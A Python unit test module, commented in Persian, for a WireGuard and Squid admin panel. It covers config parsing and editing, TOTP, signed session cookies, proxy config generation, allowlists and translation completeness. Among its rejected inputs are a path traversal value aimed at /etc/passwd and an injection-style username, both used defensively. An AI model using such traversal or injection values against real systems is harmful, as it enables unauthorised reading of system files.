# -*- coding: utf-8 -*-
"""تست‌های خودکار حساس‌ترین بخش‌های wg-panel: پارسر و ویرایشگر کانفیگ،
TOTP، کوکی سشن و allowlist.

اجرا:  python3 -m unittest discover -s tests -v
یا:    python3 -m pytest tests/ -v   (در صورت نصب pytest)

هیچ دستوری واقعاً اجرا نمی‌شود — run/subprocess ماک می‌شوند.
"""

import ast
import base64
import builtins
import hashlib
import io
import importlib.util
import json
import os
import pathlib
import re
import shutil
import subprocess as real_subprocess
import stat
import sys
import tempfile
import threading
import time
import types
import unittest

HERE = os.path.dirname(os.path.abspath(__file__))
PANEL = os.path.join(HERE, "..", "wg_panel.py")
# ریشه‌ی مخزن — برای گاردهایی که فایل‌های بیرونِ wg_panel.py را می‌سنجند
ROOT = pathlib.Path(HERE).parent

# آدرس‌هایی که نقشِ «خودِ سرور» را در فیکسچرها بازی می‌کنند. عمداً از رنجِ
# مستندسازیِ RFC 5737 ‏(TEST-NET-3، 203.0.113.0/24) می‌آیند که هرگز
# مسیریابی‌پذیر نیست.
#
# تا ۱۳ اوت ۲۰۲۶ اینجا بلاکِ /29 واقعیِ سرور بود — آدرسِ خودش، گیت‌وی،
# همسایه، و دو سابنتِ دربرگیرنده. هیچ ارزشِ آزمونی نداشت (تست با هر آدرسی
# سبز می‌ماند، چون فقط روابطِ بین آن‌ها را می‌سنجد) و صرفاً بلاکِ واقعیِ
# زیرساخت را در مخزن نگه می‌داشت. روابط دست‌نخورده ماندند: تنها پیشوندِ
# /24 عوض شد.
SRV_IP = "203.0.113.68"          # آدرسِ eth0 ِ خودِ سرور
SRV_GW = "203.0.113.65"          # گیت‌وی پیش‌فرض
SRV_NB = "203.0.113.69"          # همسایه در همان /29
SRV_NET = "203.0.113.64/29"      # سابنتِ سرور
SRV_SUPERNET = "203.0.113.64/28"  # سابنتِ بزرگ‌ترِ دربرگیرنده

# 🪤 رنجِ مستندسازی جایگزینِ همه‌کاره‌ی «آدرسِ عمومی» نیست: پایتون (دستِ‌کم
# تا ۳٫۱۴) هر سه رنجِ RFC 5737 را is_private=True و is_global=False می‌داند.
# پس هر تستی که به *عمومی بودنِ* آدرس تکیه دارد با SRV_IP می‌شکند — و شکست.
# هنگامِ پاک‌سازیِ آدرس‌های واقعی، test_classify_iface از wan به lan رفت.
# آن‌جاها این ثابت را بگیر، نه SRV_IP.
WAN_IP = "1.2.3.4"               # از دیدِ ipaddress سراسری؛ جای‌نگه‌دارِ رایجِ همین سوییت

_PANEL_SRC = None


def _read_panel_source():
    """متنِ خامِ wg_panel.py — برای گاردهایی که الگوی کد را می‌سنجند.

    یک‌بار خوانده و کش می‌شود؛ فایل ~۱٫۴ مگابایت است و چند تست به آن نیاز
    دارند.
    """
    global _PANEL_SRC
    if _PANEL_SRC is None:
        with open(PANEL, encoding="utf-8") as fh:
            _PANEL_SRC = fh.read()
    return _PANEL_SRC

FIXTURE_CONF = """[Interface]
PrivateKey = FAKE_SERVER_PRIVATE_KEY_x
Address = 192.168.188.1/32
ListenPort = 53953
#MTU=1408 #UDP_MTU
MTU=1392 #fakeTCP_MTU

#!!!user01
#[Peer]
#PublicKey = PUB_USER01_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
#AllowedIPs = 192.168.188.14/32
#!!!user02
[Peer]
PublicKey = PUB_USER02_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
AllowedIPs = 192.168.188.20/32,149.154.166.110
#!!!user03
#[Peer]
#PublicKey = PUB_USER03_xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx=
#AllowedIPs = 192.168.188.21/32
"""


def load_module(tmp):
    """ماژول پنل را ایزوله بار می‌کند: مسیرها به tmp، دستورات ماک."""
    spec = importlib.util.spec_from_file_location("wg_panel_t", PANEL)
    m = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(m)

    # فایل DB ای که هنگام import در کنار سورس ساخته شده را پاک کن
    for suffix in ("", "-wal", "-shm"):
        p = m.DB_PATH + suffix
        if os.path.exists(p):
            os.remove(p)

    m.BASE_DIR = tmp  # اسنپ‌شاتِ pre-restore و مقصدِ clients هنگام بازیابی
    m.CONFIG_PATH = os.path.join(tmp, "config.json")
    m.WG_DIR = tmp
    m.BACKUP_DIR = os.path.join(tmp, "backups")
    m.CLIENTS_DIR = os.path.join(tmp, "clients")
    m.ACTION_LOG = os.path.join(tmp, "actions.log")
    m.DB_PATH = os.path.join(tmp, "traffic.db")
    m.META = m.MetaDB()
    m.WATCHER = types.SimpleNamespace(resync=lambda: None)
    m.CONFIG = {
        "secret": "s" * 64,
        "server_ifaces": ["wgtest"],
        "user_subnets": {"wgtest": "192.168.188.0/24"},
        "server_host": "example.test",
        "client_dns": "1.1.1.1, 8.8.8.8",
        "client_mtu": 1420,
        "users": [],
        "allow_ips": [],
    }
    m.live_interfaces = lambda: ["wgtest"]

    calls = []

    def fake_run(cmd, timeout=20):
        calls.append(cmd)
        if cmd[:2] == ["wg", "genkey"]:
            return 0, "FAKE_PRIV_%02d=\n" % len(calls), ""
        if cmd[:2] == ["wg", "genpsk"]:
            return 0, "FAKE_PSK_%02d=\n" % len(calls), ""
        if cmd[:2] == ["wg", "show"] and cmd[-1] == "public-key":
            return 0, "FAKE_SERVER_PUB=\n", ""
        if cmd and cmd[0] == "ping":
            return 0, "PING %s: 0%% packet loss" % cmd[-1], ""
        return 0, "", ""

    m.run = fake_run
    m._run_calls = calls
    # SAMPLER تستی: کش‌های خالی تا peer_overrides از META بخواند
    m.SAMPLER = types.SimpleNamespace(
        meta_cache={}, month_usage={}, life_usage={},
        refresh_meta=lambda: None)

    real = real_subprocess.run

    def fake_sub_run(cmd, **kw):
        if cmd == ["wg", "pubkey"]:
            priv = kw.get("input", "").strip()
            r = types.SimpleNamespace(returncode=0,
                                      stdout="PUB_OF_" + priv + "\n", stderr="")
            return r
        return real(cmd, **kw)

    m.subprocess = types.SimpleNamespace(run=fake_sub_run,
                                         TimeoutExpired=real_subprocess.TimeoutExpired)
    return m


def make_fake_handler(m, path="/", method="GET", body=None, headers=None,
                      session=None, client_ip="127.0.0.1"):
    """Handler بدونِ سوکت — برای راندنِ do_GET/do_POST و گیتِ RBAC.

    نسخه‌ی اولیه فقط send_* را ماک می‌کرد و همان برای روت‌های استاتیکِ
    do_GET کافی بود؛ به همین دلیل _perm_denied و do_POST هرگز اجرا
    نمی‌شدند. افزوده‌ها: path، headers، rfile و session.

    ⚠️ مرزهای این هارنس — عمدی، و در پلنِ ۰۲۴ پوشش داده می‌شوند:
      • سوکتِ واقعی ندارد؛ فریم‌بندی و Content-Length سنجیده نمی‌شوند.
      • _session جایگزین می‌شود، پس امضا/تأییدِ کوکیِ نشست پوشش ندارد.
      • TLS در کار نیست.
    یعنی «سبز بودنِ این کلاس» درباره‌ی آن سه چیز هیچ نمی‌گوید.

    headers یک dict ِ ساده است نه email.message.Message: همه‌ی
    self.headers.get(...) در wg_panel.py با همین حروف‌بندی صدا زده
    می‌شوند (Accept-Encoding، Content-Length، Cookie، Host، Origin،
    X-Confirm-Password، Authorization، Accept-Language) — بررسی شد.
    اگر روزی جایی حروف‌بندیِ دیگری بخواند، این باید Message شود.
    """
    h = m.Handler.__new__(m.Handler)
    # BaseHTTPRequestHandler.__init__ این را ست می‌کند و ما __init__ را
    # صدا نمی‌زنیم؛ _send برای تصمیمِ «Connection: close» می‌خواندش.
    h.close_connection = False
    h.client_address = (client_ip, 9)
    h.path = path
    h.command = method
    h.sent = []
    h.body = []
    raw = b"" if body is None else (
        body if isinstance(body, bytes) else json.dumps(body).encode())
    hdrs = dict(headers or {})
    hdrs.setdefault("Content-Length", str(len(raw)))
    hdrs.setdefault("Host", "panel.test")
    h.headers = hdrs
    h.rfile = io.BytesIO(raw)
    h.send_response = lambda code: h.sent.append(("__code__", code))
    h.send_header = lambda k, v: h.sent.append((k, v))
    h.end_headers = lambda: None
    h.wfile = types.SimpleNamespace(write=lambda b: h.body.append(b))
    if session is not None or "Cookie" not in hdrs:
        # نشستِ ساختگی به‌جای ساختنِ کوکیِ امضاشده: موضوعِ این هارنس
        # «گیت با یک نشستِ مشخص چه می‌کند» است، نه «کوکی چطور امضا
        # می‌شود». آن یکی تستِ خودش را دارد.
        h._session = lambda: session
    return h


class PanelTestCase(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp(prefix="wgpanel-test-")
        self.m = load_module(self.tmp)
        with open(os.path.join(self.tmp, "wgtest.conf"), "w",
                  encoding="utf-8") as f:
            f.write(FIXTURE_CONF)

    def tearDown(self):
        shutil.rmtree(self.tmp, ignore_errors=True)

    def read_conf(self):
        with open(os.path.join(self.tmp, "wgtest.conf"), encoding="utf-8") as f:
            return f.read()

    # ---------------------------------------------------------------- پارسر
    def test_parse_blocks(self):
        blocks = self.m.parse_user_blocks("wgtest")
        self.assertEqual([b["name"] for b in blocks],
                         ["user01", "user02", "user03"])
        self.assertEqual([b["enabled"] for b in blocks], [False, True, False])
        self.assertEqual(blocks[1]["allowed_ips"],
                         "192.168.188.20/32,149.154.166.110")
        self.assertTrue(blocks[0]["public_key"].startswith("PUB_USER01"))

    def test_conf_is_server_type(self):
        self.assertTrue(self.m._conf_is_server_type(
            os.path.join(self.tmp, "wgtest.conf")))
        with open(os.path.join(self.tmp, "wgtun.conf"), "w") as f:
            f.write("[Interface]\nListenPort = 1\n[Peer]\nEndpoint = 1.2.3.4:1\n")
        self.assertFalse(self.m._conf_is_server_type(
            os.path.join(self.tmp, "wgtun.conf")))

    def test_next_free_ip_skips_used_and_server(self):
        blocks = self.m.parse_user_blocks("wgtest")
        ip = self.m.next_free_ip("wgtest", blocks)
        self.assertEqual(ip, "192.168.188.10")  # .1 سرور، شروع از .10
        self.assertNotIn(ip, ("192.168.188.14", "192.168.188.20",
                              "192.168.188.21"))

    # ------------------------------------------------------ toggle رفت‌وبرگشت
    def test_toggle_roundtrip_preserves_file(self):
        original = self.read_conf()
        ok, _ = self.m.set_peer_enabled("wgtest", "user01", True)
        self.assertTrue(ok)
        blocks = self.m.parse_user_blocks("wgtest")
        self.assertTrue(next(b for b in blocks if b["name"] == "user01")["enabled"])
        ok, _ = self.m.set_peer_enabled("wgtest", "user01", False)
        self.assertTrue(ok)
        self.assertEqual(self.read_conf(), original)

    def test_toggle_uses_wg_set(self):
        self.m._run_calls.clear()
        self.m.set_peer_enabled("wgtest", "user02", False)
        wg_sets = [c for c in self.m._run_calls if c[:2] == ["wg", "set"]]
        self.assertEqual(len(wg_sets), 1)
        self.assertIn("remove", wg_sets[0])

    def test_toggle_missing_user(self):
        ok, msg = self.m.set_peer_enabled("wgtest", "ghost", True)
        self.assertFalse(ok)

    # ------------------------------------------------------------- add/delete
    def test_add_then_delete_restores_file(self):
        original = self.read_conf()
        result, err = self.m.add_peer("wgtest", "newguy")
        self.assertIsNone(err)
        self.assertEqual(result["ip"], "192.168.188.10")
        conf = result["client_conf"]
        self.assertIn("MTU = 1420", conf)
        self.assertIn("DNS = 1.1.1.1, 8.8.8.8", conf)
        # پیش‌فرض شاملِ ::/0 تا v6 هم واردِ تونل شده و دراپ شود (ضدِ نشتِ v6
        # که مسیریابیِ WARP را دور می‌زد)
        self.assertIn("AllowedIPs = 0.0.0.0/0, ::/0", conf)
        self.assertIn("Endpoint = example.test:53953", conf)
        self.assertTrue(self.m.has_client_conf("wgtest", "newguy"))
        ok, _ = self.m.delete_peer("wgtest", "newguy")
        self.assertTrue(ok)
        self.assertFalse(self.m.has_client_conf("wgtest", "newguy"))
        self.assertEqual(self.read_conf().rstrip("\n"), original.rstrip("\n"))

    def test_add_duplicate_rejected(self):
        _, err = self.m.add_peer("wgtest", "user02")
        self.assertIsNotNone(err)

    def test_add_bad_name_rejected(self):
        _, err = self.m.add_peer("wgtest", "بدنام!")
        self.assertIsNotNone(err)

    # ---------------------------------------------------------------- rotate
    def test_rotate_changes_only_pubkey(self):
        before = self.read_conf().splitlines()
        result, err = self.m.rotate_peer_key("wgtest", "user02")
        self.assertIsNone(err)
        after = self.read_conf().splitlines()
        diff = [(a, b) for a, b in zip(before, after) if a != b]
        self.assertEqual(len(diff), 1)
        self.assertIn("PublicKey", diff[0][1])
        # کاربر غیرفعال: خط کامنت‌شده باید کامنت بماند
        result, err = self.m.rotate_peer_key("wgtest", "user01")
        self.assertIsNone(err)
        blocks = self.m.parse_user_blocks("wgtest")
        self.assertFalse(next(b for b in blocks if b["name"] == "user01")["enabled"])

    # ------------------------------------------------------------ allowed-ips
    def test_update_ips_valid(self):
        ok, _ = self.m.update_peer_ips("wgtest", "user02",
                                       "192.168.188.20/32, 10.9.0.1")
        self.assertTrue(ok)
        blocks = self.m.parse_user_blocks("wgtest")
        self.assertEqual(next(b for b in blocks if b["name"] == "user02")
                         ["allowed_ips"], "192.168.188.20/32,10.9.0.1")

    def test_update_ips_invalid_rejected_and_file_untouched(self):
        original = self.read_conf()
        ok, _ = self.m.update_peer_ips("wgtest", "user02", "abc!!")
        self.assertFalse(ok)
        self.assertEqual(self.read_conf(), original)

    # ------------------------------------------------------------------ بکاپ
    def test_backup_prune(self):
        src = os.path.join(self.tmp, "wgtest.conf")
        for _ in range(60):
            self.m.backup_conf(src, keep=50)
        files = [f for f in os.listdir(self.m.BACKUP_DIR)
                 if f.startswith("wgtest.conf.")]
        self.assertEqual(len(files), 50)

    # ------------------------------------------------------------------ TOTP
    def test_totp_rfc6238_vector(self):
        # RFC 6238، SHA1، secret ascii "12345678901234567890"
        import base64
        secret = base64.b32encode(b"12345678901234567890").decode()
        self.assertEqual(self.m.totp_code(secret, t=59), "287082")
        self.assertEqual(self.m.totp_code(secret, t=1111111109), "081804")
        self.assertTrue(self.m.totp_verify(secret, self.m.totp_code(secret)))
        # کدِ غلط باید قطعاً بیرونِ پنجره‌ی پذیرش باشد؛ ثابتِ «000000» می‌توانست
        # همان کدِ لحظه باشد و کاذب بشکند (پنجره ±۱ گام است؛ ±۲ گرفته‌ایم تا
        # عبور از مرزِ ۳۰ ثانیه بینِ این محاسبه و خودِ totp_verify هم پوشش یابد)
        window = {self.m.totp_code(secret, time.time() + d * 30)
                  for d in (-2, -1, 0, 1, 2)}
        wrong = next(cand for cand in ("%06d" % n for n in range(len(window) + 1))
                     if cand not in window)
        self.assertFalse(self.m.totp_verify(secret, wrong))
        self.assertFalse(self.m.totp_verify(secret, "abc"))
        # ارقام فارسی نباید کرش کند (باگ \d یونیکد + compare_digest)
        self.assertFalse(self.m.totp_verify(secret, "۱۲۳۴۵۶"))
        self.assertFalse(self.m.totp_verify(secret, "۰" * 6))

    # ------------------------------------------------------------------ سشن
    def test_session_cookie_roundtrip_and_tamper(self):
        user = {"username": "admin", "salt": "00", "hash": "x",
                "role": "admin", "totp": "", "stoken": "abc123"}
        self.m.CONFIG["users"] = [user]
        c = self.m.make_session_cookie(user)
        sess = self.m.verify_session_cookie(c)
        self.assertEqual(sess["u"], "admin")
        self.assertEqual(sess["r"], "admin")
        # دستکاری باید قطعی باشد: جایگزینیِ ثابتِ «ff» وقتی امضا خودش به ff
        # ختم می‌شد no-op بود و ۱ از هر ۲۵۶ اجرا کاذب می‌شکست
        self.assertIsNone(self.m.verify_session_cookie(
            c[:-1] + ("0" if c[-1] != "0" else "1")))
        self.assertIsNone(self.m.verify_session_cookie("garbage"))
        # کاربر حذف‌شده → سشن نامعتبر
        self.m.CONFIG["users"] = []
        self.assertIsNone(self.m.verify_session_cookie(c))

    def test_session_invalidated_on_password_change(self):
        user = {"username": "u1", "salt": "00", "hash": "x",
                "role": "viewer", "totp": "", "stoken": "tok1"}
        self.m.CONFIG["users"] = [user]
        self.m.CONFIG_PATH = os.path.join(self.tmp, "config.json")
        c = self.m.make_session_cookie(user)
        self.assertIsNotNone(self.m.verify_session_cookie(c))
        # تغییر رمز → stoken می‌چرخد → کوکی قبلی باید باطل شود
        self.m.set_user_password(user, "newpassword123")
        self.assertIsNone(self.m.verify_session_cookie(c))
        # کوکی تازه معتبر است
        self.assertIsNotNone(self.m.verify_session_cookie(
            self.m.make_session_cookie(user)))

    def test_protected_admin(self):
        # اولین کاربرِ config حسابِ محافظت‌شده است (admin)؛ بقیه نه.
        self.m.CONFIG["users"] = [
            {"username": "admin", "salt": "00", "hash": "x", "role": "admin",
             "totp": "", "stoken": "a"},
            {"username": "bob", "salt": "00", "hash": "y", "role": "admin",
             "totp": "", "stoken": "b"}]
        self.assertTrue(self.m.is_protected_admin("admin"))
        self.assertFalse(self.m.is_protected_admin("bob"))
        self.assertFalse(self.m.is_protected_admin("nobody"))
        # اگر حسابِ اصلی نامِ دیگری داشته باشد، همان محافظت می‌شود (نه لزوماً «admin»)
        self.m.CONFIG["users"] = [
            {"username": "root", "salt": "00", "hash": "x", "role": "admin",
             "totp": "", "stoken": "a"}]
        self.assertTrue(self.m.is_protected_admin("root"))
        self.assertFalse(self.m.is_protected_admin("admin"))

    def test_proxy_user_validation(self):
        ok = ["alice", "bob_1", "a.b-c", "User99"]
        bad = ["a", "x" * 33, "bad user", "drop;table", "a/b", "", "کاربر",
               'x"y', "a b"]
        for n in ok:
            self.assertTrue(self.m.valid_proxy_user(n), n)
        for n in bad:
            self.assertFalse(self.m.valid_proxy_user(n), n)

    def test_proxy_squid_conf(self):
        conf = self.m.proxy_squid_conf([
            {"username": "alice", "rate_kbit": 8000, "allow_src": []},
            {"username": "bob", "rate_kbit": 2000, "allow_src": []}])
        self.assertIn("http_port %d" % self.m.PROXY_PORT, conf)
        self.assertIn("acl to_internal dst 127.0.0.0/8", conf)
        self.assertIn("http_access deny to_internal", conf)
        self.assertIn("http_access deny all", conf)
        self.assertIn("delay_pools 2", conf)
        self.assertIn("delay_parameters 1 1000000/1000000", conf)  # 8000kbit
        self.assertIn("delay_parameters 2 250000/250000", conf)    # 2000kbit
        self.assertIn("acl u_alice proxy_auth alice", conf)
        self.assertNotIn("delay_pools", self.m.proxy_squid_conf([]))

    def test_proxy_squid_conf_allow_src(self):
        conf = self.m.proxy_squid_conf([
            {"username": "carol", "rate_kbit": 0,
             "allow_src": ["5.114.20.10/32", "2.190.0.0/16"]}])
        # acl مبدأ و قانونِ deny برای IP غیرمجاز
        self.assertIn("acl src_carol src 5.114.20.10/32 2.190.0.0/16", conf)
        self.assertIn("acl u_carol proxy_auth carol", conf)
        self.assertIn("http_access deny u_carol !src_carol", conf)
        # کاربرِ بدونِ allow_src هیچ deny مبدأ نمی‌گیرد
        conf2 = self.m.proxy_squid_conf([
            {"username": "dan", "rate_kbit": 0, "allow_src": []}])
        self.assertNotIn("src_dan", conf2)

    def test_proxy_squid_conf_protocol(self):
        conf = self.m.proxy_squid_conf([
            {"username": "hu", "rate_kbit": 0, "allow_src": [], "protocol": "http"},
            {"username": "hs", "rate_kbit": 0, "allow_src": [], "protocol": "https"},
            {"username": "bo", "rate_kbit": 0, "allow_src": [], "protocol": "both"}])
        self.assertIn("acl u_hu proxy_auth hu", conf)
        self.assertIn("http_access deny u_hu CONNECT", conf)     # http = بدونِ CONNECT
        self.assertIn("http_access deny u_hs !CONNECT", conf)    # https = فقط CONNECT
        self.assertNotIn("u_bo CONNECT", conf)                   # both = بدونِ محدودیت
        self.assertNotIn("acl u_bo", conf)

    def test_parse_allow_src(self):
        self.assertEqual(self.m.parse_allow_src(""), ([], None))
        self.assertEqual(
            self.m.parse_allow_src("5.114.20.10, 2.190.0.0/16")[0],
            ["5.114.20.10/32", "2.190.0.0/16"])
        self.assertEqual(self.m.parse_allow_src("::1")[0], ["::1/128"])
        val, err = self.m.parse_allow_src("bad..ip")
        self.assertIsNone(val)
        self.assertIsNotNone(err)

    def test_proxy_log_line_parse(self):
        # regex: 1=IP، 2=user، 3=method، 4=url، 5=code، 6=out، 7=in
        line = ('18/Jul/2026:00:54:33 +0330 127.0.0.1 "alice" GET '
                'http://example.com/ 200 out=917 in=183 113 "curl/8.5.0"')
        mt = self.m._PROXY_LINE_RE.search(line)
        self.assertIsNotNone(mt)
        self.assertEqual(mt.group(1), "127.0.0.1")   # IP مبدأ
        self.assertEqual(mt.group(2), "alice")        # نام کاربر
        self.assertEqual(mt.group(3), "GET")          # متد
        self.assertEqual(mt.group(4), "http://example.com/")  # مقصد
        self.assertEqual(mt.group(5), "200")          # کدِ وضعیت
        self.assertEqual(int(mt.group(6)) + int(mt.group(7)), 1100)
        # خطِ بی‌کاربر ("-"): نامِ کاربر «-» است
        anon = self.m._PROXY_LINE_RE.search(
            '2026 5.6.7.8 "-" GET http://x/ 407 out=10 in=5 1 "ua"')
        self.assertTrue(anon is None or anon.group(2) == "-")

    def test_proxy_dest_host(self):
        f = self.m._proxy_dest_host
        self.assertEqual(f("CONNECT", "push.webexconnect.com:443"),
                         "push.webexconnect.com")
        self.assertEqual(f("GET", "http://www.gstatic.com/generate_204"),
                         "www.gstatic.com")
        self.assertIsNone(f("-", "error:invalid-request"))
        self.assertIsNone(f("GET", "-"))

    def test_proxy_conf_noauth_user(self):
        # کاربرِ بدونِ‌رمز: allow بر اساسِ IP قبل از لایه‌ی auth، بدونِ ورود در passwd
        conf = self.m.proxy_squid_conf([
            {"username": "appsrv", "pass_hash": "", "rate_kbit": 5000,
             "allow_src": ["5.114.20.10/32"], "protocol": "both",
             "noauth": True},
        ])
        self.assertIn("acl noauth_appsrv src 5.114.20.10/32", conf)
        # allow کاربرِ بدونِ‌رمز باید پیش از allow authenticated باشد
        self.assertLess(conf.index("http_access allow noauth_appsrv"),
                        conf.index("http_access allow authenticated"))
        # delay pool روی همان ACLِ src
        self.assertIn("delay_access 1 allow noauth_appsrv", conf)
        # نباید acl proxy_auth برای این کاربر ساخته شود
        self.assertNotIn("acl u_appsrv", conf)

    def test_session_role_from_current_record(self):
        user = {"username": "u2", "salt": "00", "hash": "x",
                "role": "viewer", "totp": "", "stoken": "tok2"}
        self.m.CONFIG["users"] = [user]
        c = self.m.make_session_cookie(user)  # صادرشده وقتی viewer بود
        user["role"] = "admin"                # نقش بعداً تغییر کرد
        sess = self.m.verify_session_cookie(c)
        self.assertEqual(sess["r"], "admin")  # نقشِ به‌روز، نه منجمد

    def test_conf_path_no_traversal(self):
        p = self.m.conf_path("../../etc/passwd")
        self.assertTrue(p.startswith(self.m.WG_DIR))
        self.assertNotIn("..", os.path.relpath(p, self.m.WG_DIR))

    # -------------------------------------------------------------- allowlist
    def test_ip_allowed(self):
        m = self.m
        m.CONFIG["allow_ips"] = []
        self.assertTrue(m.ip_allowed("8.8.8.8"))
        m.CONFIG["allow_ips"] = ["5.5.5.0/24", "9.9.9.9"]
        self.assertTrue(m.ip_allowed("5.5.5.7"))
        self.assertTrue(m.ip_allowed("9.9.9.9"))
        self.assertTrue(m.ip_allowed("127.0.0.1"))  # همیشه مجاز
        self.assertFalse(m.ip_allowed("8.8.8.8"))
        self.assertFalse(m.ip_allowed("not-an-ip"))

    # ----------------------------------------------------- اینترفیس‌ها
    def test_classify_iface(self):
        c = self.m.classify_iface
        self.assertEqual(c("lo", ["127.0.0.1"])[0], "loopback")
        self.assertEqual(c("wgtest", ["192.168.188.1"])[1], "wg_users")
        self.assertEqual(c("awg1", [])[0], "amneziawg")
        self.assertEqual(c("wg21", [])[0], "wireguard")
        # eth با فقط IP عمومی → WAN
        self.assertEqual(c("eth0", [WAN_IP])[1], "wan")
        # eth با IP خصوصی (حتی همراه عمومی) → LAN
        self.assertEqual(c("eth1", ["172.16.20.1", "2.2.2.2"])[1], "lan")

    def test_iface_role_codes_are_stable_and_translatable(self):
        """کدِ نقش باید لاتینِ پایدار باشد و برای هر کد ترجمه وجود داشته باشد.

        گاردِ خانوادگی: پیش از چهارزبانه‌شدن، classify_iface برچسبِ **فارسی**
        برمی‌گرداند و همان رشته هم در API می‌رفت، هم برچسبِ متریکِ Prometheus
        می‌شد و هم در سه نقطه با literal ِ فارسی مقایسه می‌شد. هر بازگشتی به
        آن الگو — برچسبِ محلی‌شده به‌جای کد — اینجا قرمز می‌شود.
        """
        c = self.m.classify_iface
        samples = [("lo", ["127.0.0.1"]), ("wgtest", ["192.168.188.1"]),
                   ("awg1", []), ("wg21", []), ("eth0", [WAN_IP]),
                   ("eth1", ["172.16.20.1"]), ("eth2", []),
                   ("br0", ["10.1.1.1"]), ("tun9", []), ("ipip0@NONE", [])]
        for name, addrs in samples:
            kind, role = c(name, addrs)
            with self.subTest(iface=name):
                self.assertRegex(
                    role, r"^[a-z0-9_]+$",
                    "کدِ نقش باید لاتینِ پایدار باشد، نه متنِ نمایشی")
                self.assertIn("ui.role." + role, self.m.I18N,
                              "کدِ نقش ترجمه ندارد: " + role)

    # ------------------------------------------------- i18n (چهارزبانه)
    def test_i18n_catalog_is_complete_in_four_languages(self):
        """هر ورودیِ کاتالوگ باید تاپلِ چهارتایی باشد و فارسی نشت نکند.

        گاردِ خانوادگی: خانهٔ جاافتاده یعنی آن رشته در en/ru/zh فارسی
        می‌مانَد — خرابیِ خاموشی که هیچ تستِ دیگری نمی‌بیند.
        """
        m = self.m
        self.assertEqual(len(m.LANGS), 4)
        for key, row in m.I18N.items():
            with self.subTest(key=key):
                self.assertEqual(len(row), len(m.LANGS),
                                 "تاپل چهارتایی نیست")
                self.assertTrue(row[0], "فارسی خالی است")
                for i in range(1, 4):
                    self.assertNotRegex(
                        row[i] or "", r"[؀-ۿ]",
                        "متنِ فارسی در زبانِ %s نشت کرده" % m.LANGS[i])

    def test_i18n_placeholders_match_across_languages(self):
        """جای‌گیرهای {name} باید در هر چهار زبان یکسان باشند.

        جای‌گیرِ جاافتاده در یک زبان یعنی آن زبان مقدار را نشان نمی‌دهد؛
        جای‌گیرِ اضافه یعنی «{p0}» خام روی صفحه دیده می‌شود.
        """
        ph = re.compile(r"\{(\w+)\}")
        for key, row in self.m.I18N.items():
            base = set(ph.findall(row[0]))
            for i in range(1, 4):
                if not row[i]:
                    continue
                with self.subTest(key=key, lang=self.m.LANGS[i]):
                    self.assertEqual(set(ph.findall(row[i])), base,
                                     "مجموعهٔ جای‌گیرها فرق دارد")

    def test_audit_stores_stable_codes_not_localized_text(self):
        """ممیزی باید کد ذخیره کند، نه متنِ نمایشی.

        گاردِ خانوادگی: پیش از چهارزبانه‌شدن، ستونِ action متنِ آزادِ فارسی
        می‌گرفت و همان متن هم در دیتابیس می‌ماند هم با `in` طبقه‌بندی
        می‌شد. هر بازگشتی به آن الگو اینجا قرمز می‌شود.
        """
        import ast
        # ⚠️ عمداً ast است نه regex. نسخهٔ اولِ همین گارد regex بود و
        # فراخوانیِ با پرانتزِ تودرتوی عمیق را نمی‌دید — هشت نقطهٔ ممیزی
        # با متنِ فارسی از کنارش رد شدند و تست سبز ماند.
        src = _read_panel_source()
        bad = []
        for node in ast.walk(ast.parse(src)):
            if not isinstance(node, ast.Call):
                continue
            fn = node.func
            name = (fn.attr if isinstance(fn, ast.Attribute)
                    else fn.id if isinstance(fn, ast.Name) else "")
            if name not in ("audit", "_audit"):
                continue
            for sub in ast.walk(node):
                if (isinstance(sub, ast.Constant)
                        and isinstance(sub.value, str)
                        and re.search(r"[؀-ۿ]", sub.value)):
                    bad.append((node.lineno, sub.value[:50]))
        self.assertEqual(bad, [], "فراخوانیِ ممیزی با متنِ فارسی")

    def test_every_audit_key_has_a_catalog_entry(self):
        """کدِ اکشن و کلیدِ adet هر دو باید ترجمه داشته باشند."""
        src = _read_panel_source()
        for key in set(re.findall(r'adet\("([\w.]+)"', src)):
            with self.subTest(key=key):
                self.assertIn(key, self.m.I18N, "کلیدِ adet بی‌ترجمه")
        call = re.compile(
            r"(?:self\._audit|(?<![\w.])audit)\((?:[^()]|\([^()]*\))*\)")
        code = re.compile(r"^[a-z][a-z0-9]*(?:\.[a-z0-9_]+)+$")
        for c in call.finditer(src):
            for _q, v in re.findall(r"""(["'])((?:[^"'\\]|\\.)*)\1""",
                                    c.group(0)):
                if code.match(v) and not v.startswith("ui."):
                    with self.subTest(action=v):
                        self.assertIn("ui.audit.act." + v, self.m.I18N,
                                      "کدِ اکشن بی‌ترجمه")

    def test_server_labels_have_a_translation_keyed_by_their_code(self):
        """برچسب‌هایی که سرور با کلیدِ پایدار می‌فرستد باید ترجمه داشته باشند.

        مرورگر نقش‌ها، رویدادهای هشدار، اجزای بازیابی و سرویس‌های پیش‌فرض
        را با `_tOr(پیشوند + کلید, برچسبِ سرور)` نشان می‌دهد؛ کلیدِ جاافتاده
        بی‌صدا به برچسبِ فارسیِ سرور برمی‌گشت — همان نشتی که این گارد بست.
        متنِ فارسیِ کاتالوگ هم باید با برچسبِ سرور یکی بماند.
        """
        m = self.m
        pairs = [("ui.permgrp." + g, lbl) for g, lbl, _ in m.PERM_CATALOG]
        pairs += [("ui.perm." + k, pl)
                  for _, _, items in m.PERM_CATALOG for k, pl in items]
        pairs += [("ui.alertev." + k, lbl) for k, lbl in m.ALERT_EVENTS]
        pairs += [("ui.bk.comp." + k, lbl)
                  for k, lbl in m.CLOUD_RESTORE_COMPONENTS]
        pairs += [("ui.svc.name." + k, v["label"])
                  for k, v in m.SVC_DEFAULTS.items()]
        pairs += [("ui.warpev." + k, lbl)
                  for k, lbl in m.WARP_EVENT_LABELS.items()]
        for key, fa in pairs:
            with self.subTest(key=key):
                self.assertIn(key, m.I18N, "برچسب بی‌ترجمه")
                self.assertEqual(m.I18N[key][0], fa,
                                 "متنِ فارسیِ کاتالوگ با برچسبِ سرور فرق دارد")
        js = _read_panel_source()
        for prefix in ("ui.permgrp.", "ui.perm.", "ui.alertev.",
                       "ui.bk.comp.", "ui.svc.name.", "ui.warpev."):
            with self.subTest(prefix=prefix):
                self.assertIn("_tOr('%s' + " % prefix, js,
                              "مرورگر این برچسب‌ها را ترجمه نمی‌کند")

